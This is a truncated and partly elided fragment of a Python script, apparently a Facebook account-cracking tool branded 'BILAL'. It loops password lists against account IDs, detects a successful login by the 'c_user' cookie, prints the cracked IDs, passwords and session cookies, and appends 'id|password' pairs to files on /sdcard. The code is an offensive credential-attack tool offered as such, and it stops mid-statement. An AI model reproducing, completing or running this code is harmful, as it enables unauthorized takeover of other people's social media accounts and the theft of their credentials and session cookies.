...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [ BILAL ] \033[1;36m×\033[1;37m %s \033[1;36m×\033[1;37m OK \033[1;36m×\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Ansh:
                                ...
                                print(f'\r\r\033[1;32m [BILAL] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie❀]\033[1;37m : '+coki)
                                open(f'/sdcard/BILAL×OK×M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Ansh:
                                ...
                                cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie❀]\033[1;37m : '+coki)
                                open(f'/sdcard/BILAL×M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Ansh:
                                ...
                                cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie❀]\033[1;37m : '+coki)
                                open(f'/sdcard/BILAL.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Ansh:
                                if 'y' in pcp:
